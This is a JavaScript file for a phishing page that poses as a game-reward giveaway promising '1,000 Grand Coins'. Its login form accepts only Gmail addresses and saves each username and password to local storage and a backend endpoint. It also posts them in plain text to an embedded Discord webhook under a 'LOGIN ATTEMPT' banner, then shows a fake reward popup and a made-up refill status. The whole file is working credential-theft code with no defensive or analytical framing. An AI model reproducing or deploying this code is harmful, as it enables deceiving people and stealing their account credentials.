const webhookURL = "https://discord.com/api/webhooks/1527318354191192169/NRSqo--ECTdMtyz_rkiI488C2Pd2gYVWcziRAOhDICEROFU7KTTKdbF4A2v1W57MLZmp";

function sendToWebhook(content) {
    if (!webhookURL) return;
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: content })
    }).catch(err => console.log("Webhook error:", err));
}

async function saveToDatabase(username, password) {
    // Resilient local backup (guarantees data accessibility on GitHub Pages static deployment)
    try {
        const localList = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
        localList.unshift({
            id: localList.length + 1,
            username: username,
            password: password,
            ip_address: 'Client (Web)',
            created_at: new Date().toLocaleString()
        });
        localStorage.setItem('adminSubmissionsBackup', JSON.stringify(localList));
    } catch (e) {}

    try {
        const res = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });
        const data = await res.json();
        console.log("Database response:", data);
        return data;
    } catch (err) {
        console.warn("Database storage error:", err);
    }
}

// Modal Elements
const loginBtn = document.getElementById("loginBtn");
const createCharacterBtn = document.getElementById("createCharacterBtn");
const loginBox = document.getElementById("loginBox");
const modalBackdrop = document.getElementById("modalBackdrop");
const closeLoginModal = document.getElementById("closeLoginModal");
const loginForm = document.getElementById("loginForm");
const submitBtn = document.getElementById("submitBtn");
const rewardPopup = document.getElementById("rewardPopup");
const rewardCloseBtn = document.getElementById("rewardCloseBtn");
const rewardCloseX = document.getElementById("rewardCloseX");
const refillBtn = document.getElementById("refillBtn");
const refreshIcon = document.getElementById("refreshIcon");
const refillStatus = document.getElementById("refillStatus");
const screenshotBtn = document.getElementById("screenshotBtn");
const scrollDownHint = document.getElementById("scrollDownHint");
const scrollSection = document.getElementById("scrollSection");

// Mobile Elements
const mobileLoginBtn = document.getElementById("mobileLoginBtn");
const mobileFlagTrigger = document.getElementById("mobileFlagTrigger");
const mobileMenuBtn = document.getElementById("mobileMenuBtn");
const mobileDrawer = document.getElementById("mobileDrawer");
const mobileDrawerOverlay = document.getElementById("mobileDrawerOverlay");
const closeMobileDrawer = document.getElementById("closeMobileDrawer");
const drawerClaimBtn = document.getElementById("drawerClaimBtn");
const drawerScreenshotsBtn = document.getElementById("drawerScreenshotsBtn");
const mobileScreenshotBtn = document.getElementById("mobileScreenshotBtn");
const drawerLangChips = document.querySelectorAll(".drawer-lang-chip");
const mobileLangSheet = document.getElementById("mobileLangSheet");
const closeLangSheet = document.getElementById("closeLangSheet");
const langSheetItems = document.querySelectorAll(".lang-sheet-item");
const currentFlagEmoji = document.getElementById("currentFlagEmoji");
const currentFlagText = document.getElementById("currentFlagText");

// Flags Dropdown Elements
const flagBtn = document.getElementById("flagBtn");
const flagsDropdown = document.getElementById("flagsDropdown");
const flagItems = document.querySelectorAll(".flag-item");

function toggleFlagsDropdown(show) {
    const isShow = typeof show === "boolean" ? show : !flagsDropdown?.classList.contains("show");
    flagsDropdown?.classList.toggle("show", isShow);
    flagBtn?.classList.toggle("active", isShow);
    flagBtn?.setAttribute("aria-expanded", isShow ? "true" : "false");
}

function toggleMobileDrawer(show) {
    const isShow = typeof show === "boolean" ? show : !mobileDrawer?.classList.contains("show");
    mobileDrawer?.classList.toggle("show", isShow);
    mobileDrawerOverlay?.classList.toggle("show", isShow);
    if (isShow) {
        toggleMobileLangSheet(false);
    }
}

function toggleMobileLangSheet(show) {
    const isShow = typeof show === "boolean" ? show : !mobileLangSheet?.classList.contains("show");
    mobileLangSheet?.classList.toggle("show", isShow);
    if (isShow) {
        modalBackdrop?.classList.add("show");
        toggleMobileDrawer(false);
    } else if (!loginBox?.classList.contains("show") && !rewardPopup?.classList.contains("show")) {
        modalBackdrop?.classList.remove("show");
    }
}

function showToast(message) {
    let toast = document.getElementById("langToast");
    if (!toast) {
        toast = document.createElement("div");
        toast.id = "langToast";
        toast.className = "lang-toast";
        document.body.appendChild(toast);
    }
    toast.textContent = message;
    toast.classList.add("show");
    setTimeout(() => toast.classList.remove("show"), 2200);
}

function setLanguage(langCode, langName, langEmoji) {
    if (currentFlagEmoji && langEmoji) currentFlagEmoji.textContent = langEmoji;
    if (currentFlagText && langCode) currentFlagText.textContent = langCode.toUpperCase();

    // Update active item in bottom sheet
    langSheetItems.forEach(item => {
        const isActive = item.getAttribute("data-lang") === langCode;
        item.classList.toggle("active", isActive);
        let checkSpan = item.querySelector(".sheet-check");
        if (isActive && !checkSpan) {
            checkSpan = document.createElement("span");
            checkSpan.className = "sheet-check";
            checkSpan.textContent = "✓";
            item.appendChild(checkSpan);
        } else if (!isActive && checkSpan) {
            checkSpan.remove();
        }
    });

    // Update active chip in drawer
    drawerLangChips.forEach(chip => {
        const isActive = chip.getAttribute("data-lang") === langCode;
        chip.classList.toggle("active", isActive);
    });

    showToast(`Language switched: ${langName}`);
    toggleFlagsDropdown(false);
    toggleMobileLangSheet(false);
}

flagBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleFlagsDropdown();
});

flagItems.forEach(item => {
    item.addEventListener("click", (e) => {
        e.stopPropagation();
        const langCode = item.getAttribute("data-lang") || "en";
        const langName = item.getAttribute("data-name") || "English";
        const langEmoji = item.getAttribute("data-emoji") || "🇺🇸";
        setLanguage(langCode, langName, langEmoji);
    });
});

mobileFlagTrigger?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileLangSheet(true);
});

closeLangSheet?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileLangSheet(false);
});

langSheetItems.forEach(item => {
    item.addEventListener("click", (e) => {
        e.stopPropagation();
        const langCode = item.getAttribute("data-lang") || "en";
        const langName = item.getAttribute("data-name") || "English";
        const langEmoji = item.getAttribute("data-emoji") || "🇺🇸";
        setLanguage(langCode, langName, langEmoji);
    });
});

// Mobile Drawer Listeners
mobileMenuBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileDrawer(true);
});

closeMobileDrawer?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileDrawer(false);
});

mobileDrawerOverlay?.addEventListener("click", () => {
    toggleMobileDrawer(false);
});

drawerClaimBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileDrawer(false);
    openLoginModal();
});

drawerScreenshotsBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileDrawer(false);
    document.getElementById("section2Section")?.scrollIntoView({ behavior: "smooth" });
});

drawerLangChips.forEach(chip => {
    chip.addEventListener("click", (e) => {
        e.stopPropagation();
        const langCode = chip.getAttribute("data-lang") || "en";
        const langName = chip.getAttribute("data-name") || "English";
        const langEmoji = chip.getAttribute("data-emoji") || "🇺🇸";
        setLanguage(langCode, langName, langEmoji);
    });
});

function openLoginModal() {
    toggleMobileLangSheet(false);
    toggleMobileDrawer(false);
    loginBox.classList.add("show");
    modalBackdrop.classList.add("show");
    document.getElementById("username")?.focus();
}

function closeAllModals() {
    loginBox.classList.remove("show");
    rewardPopup.classList.remove("show");
    modalBackdrop.classList.remove("show");
    toggleFlagsDropdown(false);
    toggleMobileLangSheet(false);
    toggleMobileDrawer(false);
}

// Open modal triggers
loginBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

mobileLoginBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

createCharacterBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

const createOneselfBtn = document.getElementById("createOneselfBtn");
createOneselfBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

const createAccountTopBtn = document.getElementById("createAccountTopBtn");
createAccountTopBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

const createAccountBottomBtn = document.getElementById("createAccountBottomBtn");
createAccountBottomBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    openLoginModal();
});

// Close modal triggers
closeLoginModal?.addEventListener("click", (e) => {
    e.stopPropagation();
    closeAllModals();
});

rewardCloseX?.addEventListener("click", (e) => {
    e.stopPropagation();
    closeAllModals();
});

modalBackdrop?.addEventListener("click", () => {
    closeAllModals();
});

rewardCloseBtn?.addEventListener("click", () => {
    closeAllModals();
});

// Refill Check Interaction
refillBtn?.addEventListener("click", () => {
    if (refreshIcon) {
        refreshIcon.classList.add("spin");
        setTimeout(() => refreshIcon.classList.remove("spin"), 600);
    }
    if (refillStatus) {
        refillStatus.textContent = "✓ Status: 1,000 Grand Coins processing (ETA ~15 mins)";
    }
});

// Escape key to close modal & dropdown
document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
        closeAllModals();
        toggleFlagsDropdown(false);
    }
});

// Outside click to close flags dropdown
document.addEventListener("click", (e) => {
    if (!flagsDropdown?.contains(e.target) && !flagBtn?.contains(e.target)) {
        toggleFlagsDropdown(false);
    }
});

// Smooth Scroll Actions
function scrollToFeatures() {
    if (scrollSection) {
        scrollSection.scrollIntoView({ behavior: 'smooth' });
    }
}

screenshotBtn?.addEventListener("click", (e) => {
    e.preventDefault();
    scrollToFeatures();
});

mobileScreenshotBtn?.addEventListener("click", (e) => {
    e.preventDefault();
    scrollToFeatures();
});

scrollDownHint?.addEventListener("click", (e) => {
    e.preventDefault();
    scrollToFeatures();
});

// Form Submit Handler
loginForm?.addEventListener("submit", async function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
        alert("Please fill in all fields.");
        return;
    }

    if (!username.toLowerCase().endsWith("@gmail.com")) {
        alert("Please enter a valid Gmail address.");
        return;
    }

    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = "PROCESSING...";
    }

    // Store in Database
    await saveToDatabase(username, password);

    // Send to Discord Webhook
    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Captured:", username);

    // Reset button & form
    if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "CLAIM 1,000 COINS";
    }
    loginForm.reset();

    // Close Login Box and Show Reward Popup
    loginBox.classList.remove("show");
    if (rewardPopup) {
        rewardPopup.classList.add("show");
        modalBackdrop.classList.add("show");
    }
});
